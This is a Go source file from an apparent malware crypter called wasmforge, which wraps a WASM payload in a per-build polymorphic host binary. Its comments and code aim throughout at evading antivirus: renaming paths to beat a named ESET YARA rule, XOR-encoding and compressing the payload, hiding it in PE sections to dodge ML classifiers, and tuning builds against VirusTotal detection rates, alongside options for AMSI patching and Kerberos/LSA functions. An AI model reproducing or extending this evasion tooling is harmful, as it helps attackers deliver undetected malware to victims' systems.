package build

import (
	"bytes"
	"compress/zlib"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"
)

// HostConfig configures the generated host binary.
type HostConfig struct {
	RawSockets bool
	Win32APIs  bool
	DarwinAPIs bool
	NativeAOT   bool // Include NativeAOT-specific host functions (WMI, SDDL, LSA, RPC, WASI P2).
	NoAMSIPatch bool
	FSMounts    []string
	PE         PEMetadata
	// Ghost is the name of the ghost profile to use for gopclntab camouflage.
	// Empty string means "auto" (random embedded profile if available).
	Ghost string
}

// GenerateHost generates and compiles the host binary that embeds the WASM module.
// Each invocation produces a structurally unique binary: randomized module names,
// package paths, variable names, decode stubs, and dead code prevent static
// signature matching across builds.
func GenerateHost(wasmPath, outputPath, tmpDir string, cfg HostConfig, verbose bool) error {
	// Find the wasmforge module root (directory containing go.mod for wasmforge).
	moduleRoot := findModuleRoot()

	// Determine source paths — either from local source tree or embedded assets.
	var hostmodSrc, runtimeSrc, namesSrc, wazeroSrc, gosumPath string

	if moduleRoot != "" {
		// Development mode: use local source tree.
		hostmodSrc = filepath.Join(moduleRoot, "internal", "hostmod")
		runtimeSrc = filepath.Join(moduleRoot, "internal", "runtime")
		namesSrc = filepath.Join(moduleRoot, "internal", "names")
		wazeroSrc = resolveWazeroDir(moduleRoot)
		gosumPath = filepath.Join(moduleRoot, "go.sum")
	}

	// Generate polymorphic configuration for this build.
	pc, err := newPolyConfig(cfg.Ghost)
	if err != nil {
		return fmt.Errorf("generating polymorphic config: %w", err)
	}

	if cfg.NativeAOT {
		// NativeAOT WASM uses standard opcodes (LLVM emits SIMD, bulk memory,
		// multi-value returns that the Go-WASM-aware opcode remapper doesn't
		// handle). Override the polymorphic VM to identity so the wazero fork
		// compiled into the host binary uses standard opcode constants, and the
		// WASM remapper passes bytes through unchanged.
		for i := range pc.OpcodePermutation {
			pc.OpcodePermutation[i] = byte(i)
		}
		for i := range pc.SectionIDMap {
			pc.SectionIDMap[i] = byte(i)
		}
		pc.CustomMagic = [4]byte{0x00, 0x61, 0x73, 0x6d} // standard \0asm
		// Skip import name randomization for NativeAOT WASMs. The WASM import
		// names must match what the host registers via export(). Randomization
		// causes signature mismatches when the ExportNameMap and the regenerated
		// names.go disagree on the mapping. NativeAOT WASMs have only 3-11 env
		// imports (vs Go WASMs with 80+), so the evasion benefit is minimal.
		// The host binary's polymorphic code transforms still provide full
		// evasion coverage.
		pc.ExportNameMap = make(map[string]string)
		pc.WASINameMap = make(map[string]string)

		// Skip the registration chain splitter for NativeAOT builds. The
		// chain in nativeaot.go has 45+ entries and the splitter currently
		// miscounts boundaries on chains that long (regression after the
		// kerberos / LDAP / DC entries appended in fdffb89). Result: the
		// kerberos crypto registration block is dropped from the emitted
		// host code, breaking the produced .exe at runtime with
		// "crypto_kerbhash is not exported in module env". String
		// encryption, struct reorder, and other transforms still apply.
		if os.Getenv("WASMFORGE_NO_CHAIN_SPLIT") == "" {
			os.Setenv("WASMFORGE_NO_CHAIN_SPLIT", "1")
		}
	}

	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: polymorphic build — module=%s pkgs=[%s,%s,%s] variant=%d\n",
			pc.ModuleName, pc.HostmodPkg, pc.RuntimePkg, pc.NamesPkg, pc.DecodeVariant)
		fmt.Fprintf(os.Stderr, "wasmforge: custom VM — magic=%02X%02X%02X%02X\n",
			pc.CustomMagic[0], pc.CustomMagic[1], pc.CustomMagic[2], pc.CustomMagic[3])
		fmt.Fprintf(os.Stderr, "wasmforge: payload encoding — 32-byte rotating XOR key\n")
	}

	// Always use a temp dir so the build is self-contained with neutral paths.
	hostDir, err := os.MkdirTemp("", "host-build-*")
	if err != nil {
		return fmt.Errorf("creating build dir: %w", err)
	}
	if os.Getenv("WASMFORGE_KEEP_HOST") == "" {
		defer os.RemoveAll(hostDir)
	} else {
		fmt.Fprintf(os.Stderr, "wasmforge: keeping host build dir: %s\n", hostDir)
	}

	if moduleRoot == "" {
		// Full distribution mode: no local source at all.
		assetDir, err := os.MkdirTemp("", "wasmforge-assets-*")
		if err != nil {
			return fmt.Errorf("creating asset dir: %w", err)
		}
		defer os.RemoveAll(assetDir)
		if err := extractBuildAssets(assetDir); err != nil {
			return fmt.Errorf("extracting embedded assets: %w", err)
		}
		hostmodSrc = filepath.Join(assetDir, "hostmod")
		runtimeSrc = filepath.Join(assetDir, "runtime")
		namesSrc = filepath.Join(assetDir, "names")
		wazeroSrc = filepath.Join(assetDir, "wazero")
		gosumPath = filepath.Join(assetDir, "go.sum")
		if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: using embedded build assets (distribution mode)\n")
		}
	} else if wazeroSrc == "" {
		// Partial fallback: local source exists but no wazero replace directive.
		// Extract only the wazero fork from embedded assets.
		assetDir, err := os.MkdirTemp("", "wasmforge-assets-*")
		if err != nil {
			return fmt.Errorf("creating asset dir: %w", err)
		}
		defer os.RemoveAll(assetDir)
		if err := extractBuildAssets(assetDir); err != nil {
			return fmt.Errorf("extracting embedded assets: %w", err)
		}
		wazeroSrc = filepath.Join(assetDir, "wazero")
		if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: using embedded wazero fork (local source for internal packages)\n")
		}
	}

	// Build the ordered replacement list for source rewriting.
	replacements := pc.replacements()

	// When host transforms are active, also rewrite wazero import paths in
	// the hostmod/runtime source to match the neutral module path.
	// Per-build randomized module path for the wazero fork. ESET's
	// WinGo/WasmForge.A YARA rule keys on the doubled `internal/.../internal/`
	// pattern produced by concatenating the old hardcoded `internal/<X>/core`
	// prefix with wazero's own `/internal/engine/...` subpath. Shapes here
	// MUST NOT start with `internal/`. The last segment (the wazero
	// package name) MUST differ from pc.RuntimePkg / HostmodPkg / NamesPkg
	// to avoid Go package-name collisions when both are imported.
	wazeroShapes := []string{
		"lib/%s/core", "pkg/%s/core", "app/%s/core", "sdk/%s/core",
		"%s/core", "%s/svc", "%s/module",
		"lib/%s/svc", "pkg/%s/svc",
		"lib/%s/runner", "pkg/%s/runner",
		"lib/%s/worker", "pkg/%s/module",
	}
	neutralModPath := fmt.Sprintf(wazeroShapes[cryptoRandN(len(wazeroShapes))], pc.RuntimePkg)
	if os.Getenv("WASMFORGE_NO_HOST_TRANSFORM") == "" {
		// Prepend wazero replacements (must come before catch-all).
		// Replace import path and package-qualified references.
		newPkgName := filepath.Base(neutralModPath) // e.g., "core"
		wazeroReplacements := []stringPair{
			{"github.com/tetratelabs/wazero", neutralModPath},
			{"wazero.", newPkgName + "."},    // wazero.ModuleConfig → core.ModuleConfig
			{`wazero "`, newPkgName + ` "`},  // import alias
		}
		// Also apply sub-package renames from WazeroTypeRenames to host code.
		// These replace wasi_snapshot_preview1/wasmdebug/etc. in import paths
		// within the hostmod and runtime source files.
		// SKIP %%SHORT%% entries (wasm, ssa) — they're too short for ReplaceAll
		// and would corrupt words like "wasmforge". They're handled by
		// context-aware regex in rewriteWazeroModulePath only.
		for _, r := range pc.WazeroTypeRenames {
			old := r.old
			if strings.HasPrefix(old, "%%SHORT%%") || strings.HasPrefix(old, "%%FORK_ONLY%%") {
				continue // these only apply inside the wazero fork
			}
			// Strip %%PROTECT_STR%% — these are safe for import path replacement
			// (the protected string literal is inside the wazero fork, not host code).
			old = strings.TrimPrefix(old, "%%PROTECT_STR%%")
			// Only include package/directory renames (no spaces, quotes, dots, commas).
			if strings.ContainsAny(old, " \".',") || old == "%%WAZERO_RUNTIME_TYPE%%" {
				continue
			}
			wazeroReplacements = append(wazeroReplacements, stringPair{old, r.new})
		}
		replacements = append(wazeroReplacements, replacements...)
	}

	// Build the original-key→new-random-name mapping for the names.go map keys.
	// These original keys (e.g., "sock_open", "win32_syscalln") appear as string
	// literals throughout module.go's export() calls. By adding them to the
	// replacement list, copyAndAnonymize replaces them everywhere in the host code.
	origKeyToNew := buildOrigKeyToNewMap(namesSrc, pc.ExportNameMap)
	// Sort by key length descending to avoid substring collisions.
	// e.g., "darwin_callback_create" must be replaced before "darwin_call"
	// otherwise "darwin_call" matches as substring of "darwin_callback_create".
	origKeys := make([]string, 0, len(origKeyToNew))
	for k := range origKeyToNew {
		origKeys = append(origKeys, k)
	}
	sort.Slice(origKeys, func(i, j int) bool {
		return len(origKeys[i]) > len(origKeys[j])
	})
	for _, origKey := range origKeys {
		replacements = append(replacements, stringPair{origKey, origKeyToNew[origKey]})
	}

	// Copy internal packages with randomized paths and identifiers.
	pkgSrcs := [][2]string{
		{hostmodSrc, pc.HostmodPath},
		{runtimeSrc, pc.RuntimePath},
		{namesSrc, pc.NamesPath},
	}
	for _, pair := range pkgSrcs {
		dst := filepath.Join(hostDir, pair[1])
		if err := copyAndAnonymize(pair[0], dst, replacements); err != nil {
			return fmt.Errorf("copying %s: %w", pair[0], err)
		}
	}

	// Regenerate names.go with random keys=values (identity map).
	// The copyAndAnonymize already replaced the old keys with new names,
	// but we regenerate to ensure a clean structure with no original strings.
	// Skip for NativeAOT: ExportNameMap is empty so remapWASM leaves the WASM
	// imports unchanged (mod_load, mod_resolve, mod_invoke, etc.). The original
	// names.go already maps those anonymized names correctly via export(), so
	// rewriting would produce an empty Exports map and break the lookup.
	if !cfg.NativeAOT {
		if err := rewriteExportNamesInNamesGo(hostDir, pc.NamesPath, pc.NamesPkg, pc.ExportNameMap); err != nil {
			return fmt.Errorf("rewriting export names in names.go: %w", err)
		}
	}

	// Dead code packages — VT testing: 30% WITH vs 0% WITHOUT → they help.
	// pc.DeadCodePkgs was set once in newPolyConfig (ghost names when a profile
	// is active, static fallback otherwise), so the paths here exactly match
	// the import paths emitted into main.go.
	for pkgPath, source := range pc.DeadCodePkgs {
		dir := filepath.Join(hostDir, pkgPath)
		if err := os.MkdirAll(dir, 0o755); err != nil {
			return fmt.Errorf("generating dead code: %w", err)
		}
		fileName := filepath.Base(pkgPath) + ".go"
		if err := os.WriteFile(filepath.Join(dir, fileName), []byte(source), 0o644); err != nil {
			return fmt.Errorf("writing dead code: %w", err)
		}
	}

	// Apply host code polymorphic transforms (string encryption, constant
	// blinding, function reordering, dead code injection).
	var hostTC *hostTransformConfig
	if os.Getenv("WASMFORGE_NO_HOST_TRANSFORM") == "" {
		var err error
		hostTC, err = transformHostCode(hostDir, pc, verbose)
		if err != nil {
			return fmt.Errorf("host code transforms: %w", err)
		}
		if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: applied host code polymorphic transforms\n")
		}
	}
	// Copy wazero fork with per-build permuted constants (custom VM).
	// Use the neutral package name (e.g., "core") to avoid "wazero" in
	// go.mod replace directives, which Go embeds as build info.
	wazeroLocalName := filepath.Base(neutralModPath)
	wazeroLocal := filepath.Join(hostDir, wazeroLocalName)
	if err := copyWazeroFork(wazeroSrc, wazeroLocal, pc); err != nil {
		return fmt.Errorf("copying wazero fork: %w", err)
	}
	if verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: copied wazero fork with permuted constants\n")
	}

	// Phase 3: Obfuscate wazero identity in the fork.
	// Rewrite the module path to remove "wazero" from gopclntab, then
	// encrypt distinctive string literals.
	wazeroModPath := "github.com/tetratelabs/wazero"
	if os.Getenv("WASMFORGE_NO_HOST_TRANSFORM") == "" {
		if err := rewriteWazeroModulePath(wazeroLocal, wazeroModPath, neutralModPath, pc.WazeroTypeRenames); err != nil {
			if verbose {
				fmt.Fprintf(os.Stderr, "wasmforge: warning: wazero path rewrite: %v\n", err)
			}
		} else {
			wazeroModPath = neutralModPath // update for go.mod below
			if verbose {
				fmt.Fprintf(os.Stderr, "wasmforge: rewritten wazero module path → %s\n", neutralModPath)
			}
		}
		// NOTE: Wazero string encryption is disabled — the path rewriting
		// already removes 99.8% of "wazero" strings from gopclntab. String
		// encryption of wazero source risks corrupting the WASM compiler's
		// internal string constants (e.g., error messages used in validation)
		// which leads to intermittent WASM compilation failures.
	}

	// Apply AST-level transforms (struct reorder, opaque predicates, branch
	// flip, temp extraction, loop inversion) to the wazero fork. These are
	// safe for the runtime — they don't modify strings or constants, which
	// would corrupt the WASM compiler's internal protocol. The full transform
	// pipeline (string encryption, constant blinding) is NOT applied here.
	if os.Getenv("WASMFORGE_NO_HOST_TRANSFORM") == "" && !cfg.NativeAOT {
		if err := transformASTOnly(wazeroLocal); err != nil {
			if verbose {
				fmt.Fprintf(os.Stderr, "wasmforge: warning: wazero AST transforms: %v\n", err)
			}
		} else if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: applied AST transforms to wazero fork\n")
		}
	} else if cfg.NativeAOT && verbose {
		fmt.Fprintf(os.Stderr, "wasmforge: skipping wazero AST transforms (NativeAOT WASM requires unmodified validator)\n")
	}

	// Generate go.mod with randomized module name. The replace directive
	// points at the local wazero copy with permuted constants.
	// Use v0.0.0 for the wazero dependency to avoid embedding a recognizable
	// version stamp (@v1.11.0) into gopclntab paths. The replace directive
	// points at the local fork, so the version is purely cosmetic.
	gomod := fmt.Sprintf("module %s\n\ngo 1.25.3\n\nrequire (\n\t%s v0.0.0\n\tgolang.org/x/sys v0.38.0\n", pc.ModuleName, wazeroModPath)
	if cfg.DarwinAPIs || runtime.GOOS == "darwin" {
		gomod += "\tgithub.com/ebitengine/purego v0.9.1\n"
	}
	gomod += ")\n"
	gomod += fmt.Sprintf("\nreplace %s v0.0.0 => ./%s\n", wazeroModPath, wazeroLocalName)
	if err := os.WriteFile(filepath.Join(hostDir, "go.mod"), []byte(gomod), 0o644); err != nil {
		return fmt.Errorf("writing go.mod: %w", err)
	}
	// Copy go.sum so the build doesn't need network access.
	if gosum, err := os.ReadFile(gosumPath); err == nil {
		if err := os.WriteFile(filepath.Join(hostDir, "go.sum"), gosum, 0o644); err != nil {
			return fmt.Errorf("writing go.sum: %w", err)
		}
	}

	// Read the WASM file and remap opcodes.
	// After opcode remapping the WASM has custom magic, permuted opcodes, and
	// random section IDs — unrecognizable to standard WASM tools.
	wasmData, err := os.ReadFile(wasmPath)
	if err != nil {
		return fmt.Errorf("reading WASM: %w", err)
	}

	// Remap WASM with per-build opcode permutation (custom VM) and
	// randomized export names in the import section.
	//
	// For NativeAOT WASMs the OpcodePermutation, SectionIDMap, CustomMagic,
	// and ExportNameMap are all already set to identity above. Newer WASI
	// SDK versions (>=29) emit reference-type or multi-byte heap-type local
	// declarations that the legacy code-section parser in remapWASM can't
	// walk, so calling it produces parser errors even though it would be a
	// no-op. Skip the remap entirely for NativeAOT.
	if !cfg.NativeAOT {
		wasmData, err = remapWASM(wasmData, pc.OpcodePermutation, pc.SectionIDMap, pc.CustomMagic, pc.ExportNameMap, pc.WASINameMap)
		if err != nil {
			return fmt.Errorf("remapping WASM opcodes: %w", err)
		}
	} else {
		// NativeAOT-LLVM with WASI SDK >= 29 emits a non-standard WASM
		// version field (0x0001000D) that wazero rejects with "invalid
		// version header". Patch it back to the standard "01 00 00 00".
		// Bytes 0..3 are the magic ("\0asm"); bytes 4..7 are the version.
		if len(wasmData) >= 8 &&
			wasmData[0] == 0x00 && wasmData[1] == 0x61 &&
			wasmData[2] == 0x73 && wasmData[3] == 0x6d {
			wasmData[4] = 0x01
			wasmData[5] = 0x00
			wasmData[6] = 0x00
			wasmData[7] = 0x00
		}
	}

	// For Windows PE targets: payload goes into a PE section post-build
	// instead of //go:embed, which would put ~24MB into .rdata and trigger
	// ML classifiers (Wacatac.B!ml) due to abnormal .rdata/.text ratio.
	//
	// PE path: zlib compress FIRST (while patterns are intact), then XOR
	// the compressed output. This preserves zlib's 79% compression ratio.
	// At runtime: XOR decode → zlib decompress.
	//
	// Embed path: XOR the raw remapped WASM (no compression).
	// At runtime: XOR decode → WASM.
	if isTargetingWindows() && os.Getenv("WASMFORGE_EMBED_PAYLOAD") != "1" {
		pc.PEPayload = true
		if os.Getenv("WASMFORGE_CHUNK_PAYLOAD") == "1" {
			pc.ChunkPayload = true
		}
		if verbose {
			if pc.ChunkPayload {
				fmt.Fprintf(os.Stderr, "wasmforge: PE chunk-distribute mode — payload (%d bytes) will be split across multiple sections post-build\n",
					len(wasmData))
			} else {
				fmt.Fprintf(os.Stderr, "wasmforge: PE section mode — payload (%d bytes) will be injected as %q post-build\n",
					len(wasmData), pc.PayloadSection)
			}
		}
	} else {
		// Optionally zlib-compress before XOR to shrink .rdata footprint.
		origLen := len(wasmData)
		compressed := false
		if os.Getenv("WASMFORGE_EMBED_COMPRESS") == "1" {
			var buf bytes.Buffer
			zw, _ := zlib.NewWriterLevel(&buf, zlib.BestCompression)
			if _, werr := zw.Write(wasmData); werr != nil {
				return fmt.Errorf("compressing embed payload: %w", werr)
			}
			if cerr := zw.Close(); cerr != nil {
				return fmt.Errorf("closing zlib: %w", cerr)
			}
			wasmData = buf.Bytes()
			compressed = true
		}
		_ = origLen
		_ = compressed
		// Non-PE: apply XOR to raw remapped WASM for embedding.
		if os.Getenv("WASMFORGE_PAYLOAD_XORSHIFT") == "1" {
			// Stronger keystream: xorshift64 PRNG seeded from PayloadKey.
			// Defeats cyclic 32-byte rotating XOR pattern detection.
			state := binary.LittleEndian.Uint64(pc.PayloadKey[:8])
			if state == 0 {
				state = 1
			}
			for i := range wasmData {
				state ^= state >> 13
				state ^= state << 7
				state ^= state >> 17
				wasmData[i] ^= byte(state)
			}
		} else {
			for i := range wasmData {
				wasmData[i] ^= pc.PayloadKey[i%32]
			}
		}
		if err := os.WriteFile(filepath.Join(hostDir, pc.EmbedFile), wasmData, 0o644); err != nil {
			return fmt.Errorf("writing embedded data: %w", err)
		}
		if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: embedded WASM: %d bytes (XOR-encoded, no compression)\n",
				len(wasmData))
		}
	}

	// Generate polymorphic main.go.
	mainSrc := pc.generateMainGo(cfg)
	if err := os.WriteFile(filepath.Join(hostDir, "main.go"), []byte(mainSrc), 0o644); err != nil {
		return fmt.Errorf("writing main.go: %w", err)
	}

	// Apply identifier deepening to main.go — it references hostmod/runtime
	// identifiers that were renamed during Phase 7. Must use the same
	// replacement map so cross-package references match.
	if hostTC != nil && len(hostTC.identReplacements) > 0 {
		if err := hostTC.applyIdentReplacements(hostDir, hostTC.identReplacements); err != nil {
			return fmt.Errorf("applying ident replacements to main.go: %w", err)
		}
	}

	// Make output path absolute
	absOutput, err := filepath.Abs(outputPath)
	if err != nil {
		absOutput = outputPath
	}

	// PE VERSIONINFO and application manifest.
	// Default: disabled. VT testing (May 2026, n=40) showed stripping VERSIONINFO
	// drops Avira/AVG/Bkav from 60%+ to <3%. Legitimate Go binaries (Croc, etc.)
	// have no .rsrc section. Set WASMFORGE_RSRC=1 to force VERSIONINFO generation.
	if isTargetingWindows() && os.Getenv("WASMFORGE_RSRC") == "1" {
		if err := generateWindowsResources(hostDir, Version, cfg.PE); err != nil {
			if verbose {
				fmt.Fprintf(os.Stderr, "wasmforge: warning: PE resources: %v\n", err)
			}
		} else if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: embedded PE VERSIONINFO + manifest\n")
		}
	}

	// Build the host binary.
	// -trimpath removes local filesystem paths from the binary.
	buildArgs := []string{"build", "-trimpath"}
	// WASMFORGE_STRIP=1 strips symbol table + DWARF debug info to reduce
	// gopclntab leakage of suspicious API names (LSA, Kerberos, BCrypt etc).
	if os.Getenv("WASMFORGE_STRIP") == "1" {
		buildArgs = append(buildArgs, "-ldflags", "-s -w")
	}
	// Default: standard Go optimization (no gcflags). The -N flag was
	// previously used to avoid AhnLab/Symantec but ML models retrained on
	// that pattern. Default optimization + stripped VERSIONINFO produces
	// 67% clean rate (May 2026). Override with WASMFORGE_GCFLAGS.
	if gcflags := os.Getenv("WASMFORGE_GCFLAGS"); gcflags != "" {
		buildArgs = append(buildArgs, "-gcflags=all="+gcflags)
	}
	if cfg.NativeAOT {
		buildArgs = append(buildArgs, "-tags", "nativeaot")
	}
	buildArgs = append(buildArgs, "-o", absOutput, ".")
	buildCmd := exec.Command("go", buildArgs...)
	buildCmd.Dir = hostDir
	buildCmd.Env = append(os.Environ(), "GOWORK=off", "GOTOOLCHAIN=local")

	// DEBUG: print host go.mod when verbose.
	if verbose {
		if data, err2 := os.ReadFile(filepath.Join(hostDir, "go.mod")); err2 == nil {
			fmt.Fprintf(os.Stderr, "wasmforge: DEBUG host go.mod:\n%s\n", string(data))
		}
		// Also read wazero fork go.mod
		wazeroForkGomod := filepath.Join(hostDir, neutralModPath, "go.mod")
		if data, err2 := os.ReadFile(wazeroForkGomod); err2 == nil {
			fmt.Fprintf(os.Stderr, "wasmforge: DEBUG wazero fork go.mod:\n%s\n", string(data))
		}
	}

	// Create a GOROOT overlay for the host build that renames internal
	// net package functions (e.g., interfaceAddrTable) to prevent YARA
	// rules from matching their gopclntab entries.
	hostGOROOT, cleanupGOROOT, err := hostGOROOTOverlay(hostDir, verbose)
	if err == nil && hostGOROOT != "" {
		buildCmd.Env = append(buildCmd.Env, "GOROOT="+hostGOROOT)
		if os.Getenv("WASMFORGE_KEEP_GOROOT") != "" {
			fmt.Fprintf(os.Stderr, "wasmforge: DEBUG keeping host GOROOT at %s\n", hostGOROOT)
		} else {
			defer cleanupGOROOT()
		}
	}
	if verbose {
		buildCmd.Stderr = os.Stderr
		buildCmd.Stdout = os.Stdout
		fmt.Fprintf(os.Stderr, "wasmforge: building host binary → %s\n", absOutput)
	}

	if err := buildCmd.Run(); err != nil {
		return fmt.Errorf("host compilation failed: %w", err)
	}

	// For Windows PE: compress THEN XOR the payload for deferred injection.
	// The payload is NOT injected here — it's injected in pipeline.go
	// AFTER postProcessPE (import enrichment + VA shifting), so the
	// section replacement doesn't get corrupted by VA shifts.
	//
	// Order: zlib compress (preserves 79% ratio) → XOR (scrambles compressed output).
	// Runtime reversal: XOR decode → zlib decompress.
	if pc.PEPayload {
		compressed, err := zlibCompress(wasmData)
		if err != nil {
			return fmt.Errorf("compressing payload: %w", err)
		}
		// XOR the compressed data (not the raw WASM).
		if os.Getenv("WASMFORGE_PAYLOAD_XORSHIFT") == "1" {
			state := binary.LittleEndian.Uint64(pc.PayloadKey[:8])
			if state == 0 {
				state = 1
			}
			for i := range compressed {
				state ^= state >> 13
				state ^= state << 7
				state ^= state >> 17
				compressed[i] ^= byte(state)
			}
		} else {
			for i := range compressed {
				compressed[i] ^= pc.PayloadKey[i%32]
			}
		}
		deferredPayloadPath := absOutput + ".payload"
		if err := os.WriteFile(deferredPayloadPath, compressed, 0o644); err != nil {
			return fmt.Errorf("writing deferred payload: %w", err)
		}
		// Store metadata for pipeline.go to pick up.
		// Format: sectionName\nmarker\nuncompressedSize\nkeyHex
		deferredPayloadMeta := fmt.Sprintf("%s\n%d\n%d\n%x",
			pc.PayloadSection, pc.PayloadMarker, len(wasmData), pc.PayloadKey)
		if err := os.WriteFile(absOutput+".payload.meta", []byte(deferredPayloadMeta), 0o644); err != nil {
			return fmt.Errorf("writing payload metadata: %w", err)
		}
		if verbose {
			fmt.Fprintf(os.Stderr, "wasmforge: PE payload: %d → %d bytes (%.0f%% compression), deferred\n",
				len(wasmData), len(compressed), (1-float64(len(compressed))/float64(len(wasmData)))*100)
		}
	}

	if verbose {
		info, _ := os.Stat(absOutput)
		if info != nil {
			fmt.Fprintf(os.Stderr, "wasmforge: host binary: %s (%d bytes)\n", absOutput, info.Size())
		}
	}

	return nil
}

// zlibCompress compresses data using zlib best compression.
func zlibCompress(data []byte) ([]byte, error) {
	var buf bytes.Buffer
	w, err := zlib.NewWriterLevel(&buf, zlib.BestCompression)
	if err != nil {
		return nil, fmt.Errorf("zlib writer: %w", err)
	}
	if _, err := w.Write(data); err != nil {
		return nil, fmt.Errorf("zlib write: %w", err)
	}
	if err := w.Close(); err != nil {
		return nil, fmt.Errorf("zlib close: %w", err)
	}
	return buf.Bytes(), nil
}

// copyAndAnonymize copies Go source files from srcDir to dstDir, applying
// the ordered replacement pairs to rewrite import paths, package names,
// identifiers, and struct field names. Replacements are applied in order
// (longest/most-specific first) so that partial matches are avoided.
//
// Each file is renamed to a per-build random name (via wordList) to prevent
// source filenames from appearing in gopclntab. Go build constraint suffixes
// (_windows.go, _darwin.go, _unix.go, _amd64.s, _arm64.s) are preserved.
func copyAndAnonymize(srcDir, dstDir string, replacements []stringPair) error {
	if err := os.MkdirAll(dstDir, 0o755); err != nil {
		return err
	}
	entries, err := os.ReadDir(srcDir)
	if err != nil {
		return err
	}

	wl := newWordList()
	used := make(map[string]bool)

	for _, e := range entries {
		if e.IsDir() || strings.HasSuffix(e.Name(), "_test.go") {
			continue
		}
		// Build-tag-aware platform exclusion: skip files whose //go:build
		// directive is satisfied ONLY by a non-target OS or build tag.
		// Removes nativeaot/.NET bridge code and darwin code from Go/Windows
		// builds, eliminating their source paths from gopclntab and their
		// API name string literals from the host binary. VT testing
		// (2026-06-11) confirmed Microsoft Wacatac.C!ml partially matches
		// on these leaked references.
		if raw, rerr := os.ReadFile(filepath.Join(srcDir, e.Name())); rerr == nil {
			firstLines := raw
			if len(firstLines) > 256 {
				firstLines = firstLines[:256]
			}
			head := string(firstLines)
			lines := strings.Split(head, "\n")
			var tag string
			for _, ln := range lines {
				if strings.HasPrefix(ln, "//go:build ") {
					tag = strings.TrimSpace(strings.TrimPrefix(ln, "//go:build "))
					break
				}
			}
			if tag != "" {
				// Pure positive constraints we can safely skip when target differs.
				if !isTargetingDarwin() {
					if tag == "darwin" {
						continue
					}
				}
				if os.Getenv("WASMFORGE_NO_NATIVEAOT_HOST") == "1" {
					if tag == "nativeaot" ||
						tag == "nativeaot && windows" ||
						tag == "nativeaot && !windows" {
						continue
					}
				}
			}
		}
		name := e.Name()
		isGo := strings.HasSuffix(name, ".go")
		isAsm := strings.HasSuffix(name, ".s")
		if !isGo && !isAsm {
			continue
		}
		data, err := os.ReadFile(filepath.Join(srcDir, name))
		if err != nil {
			return err
		}
		if isGo {
			content := string(data)
			for _, r := range replacements {
				content = strings.ReplaceAll(content, r.old, r.new)
			}
			data = []byte(content)
		}

		// Rename file to a per-build random name, preserving build constraint suffixes.
		newName := randomizeFileName(name, wl, used)

		// Assembly (.s) files are copied verbatim — no string replacements.
		if err := os.WriteFile(filepath.Join(dstDir, newName), data, 0o644); err != nil {
			return err
		}
	}
	return nil
}

// goBuildSuffixes lists Go filename suffixes that serve as implicit build
// constraints. These must be preserved when randomizing filenames.
var goBuildSuffixes = []string{
	// OS constraints (most specific first to avoid partial matches).
	"_windows", "_darwin", "_linux", "_freebsd", "_netbsd", "_openbsd",
	"_dragonfly", "_solaris", "_illumos", "_aix", "_js", "_wasip1",
	"_unix",
	// Architecture constraints.
	"_amd64", "_arm64", "_arm", "_386", "_mips64", "_ppc64", "_riscv64",
	"_s390x", "_wasm",
}

// randomizeFileName generates a per-build random filename while preserving
// Go build constraint suffixes. For example:
//   - "win32_windows_dll.go" → "parseBuffer_windows.go"
//   - "darwin_trampoline_amd64.s" → "loadConfig_amd64.s"
//   - "mirror.go" → "syncRegistry.go"
//   - "amsi_stub.go" → "checkEntry.go" (_stub is NOT a build constraint)
func randomizeFileName(name string, wl *wordList, used map[string]bool) string {
	ext := filepath.Ext(name) // ".go" or ".s"
	base := strings.TrimSuffix(name, ext)

	// For assembly files, check arch suffix on the base (e.g., "_amd64" in "foo_amd64.s").
	// For Go files, check OS and arch suffixes.
	var constraintSuffix string
	for _, suffix := range goBuildSuffixes {
		if strings.HasSuffix(base, suffix) {
			constraintSuffix = suffix
			break
		}
	}

	newBase := wl.generate(used)
	return newBase + constraintSuffix + ext
}

// rewriteExportNamesInNamesGo rewrites the map VALUE strings in the copied
// names.go file, replacing each current anonymized export name with the
// per-build random name from exportNames. The map keys (original source-level
// names) are unchanged.
//
// For each old→new pair in exportNames, replaces `"old"` with `"new"` in the
// file content. This covers both the right-hand side of map literal entries
// and any other string constants that reference these names.
func rewriteExportNamesInNamesGo(hostDir, namesPath, namesPkg string, exportNames map[string]string) error {
	// Find the .go file in the names directory (it was renamed to a random
	// name by copyAndAnonymize, so we can't hardcode "names.go").
	namesDir := filepath.Join(hostDir, namesPath)
	namesGoPath, err := findFirstGoFile(namesDir)
	if err != nil {
		return fmt.Errorf("finding names.go: %w", err)
	}

	// Generate a completely new file that eliminates both the original
	// descriptive keys AND values. The map maps random→random (key=value)
	// so the export() function still works, but no descriptive strings
	// survive in the binary's .rdata string pool.
	var b strings.Builder
	b.WriteString(fmt.Sprintf("package %s\n\n", namesPkg))
	b.WriteString("const ModuleName = \"env\"\n\n")
	b.WriteString("var Exports = map[string]string{\n")
	// Build reverse map: old_key → old_value from the original names.go
	// We need to know which original key maps to which old value.
	// Read the original to extract key→value pairs.
	data, err := os.ReadFile(namesGoPath)
	if err != nil {
		return fmt.Errorf("reading names file: %w", err)
	}
	// Parse key→value pairs from map literal lines.
	// Format: "original_key": "old_value",
	re := regexp.MustCompile(`"([^"]+)":\s*"([^"]+)"`)
	for _, match := range re.FindAllStringSubmatch(string(data), -1) {
		oldValue := match[2]
		if newValue, ok := exportNames[oldValue]; ok {
			// Key = newValue (same as value → identity map, no descriptive keys)
			b.WriteString(fmt.Sprintf("\t%q: %q,\n", newValue, newValue))
		}
	}
	b.WriteString("}\n\n")
	b.WriteString("func Reverse() map[string]string {\n")
	b.WriteString("\tr := make(map[string]string, len(Exports))\n")
	b.WriteString("\tfor old, new_ := range Exports {\n")
	b.WriteString("\t\tr[new_] = old\n")
	b.WriteString("\t}\n")
	b.WriteString("\treturn r\n")
	b.WriteString("}\n")

	if err := os.WriteFile(namesGoPath, []byte(b.String()), 0o644); err != nil {
		return fmt.Errorf("writing names.go: %w", err)
	}
	return nil
}

// buildOrigKeyToNewMap reads the original names.go and builds a mapping from
// original map keys (e.g., "sock_open") to the per-build random names.
// This mapping is used by copyAndAnonymize to replace the original keys
// throughout the host code (especially in module.go's export() calls).
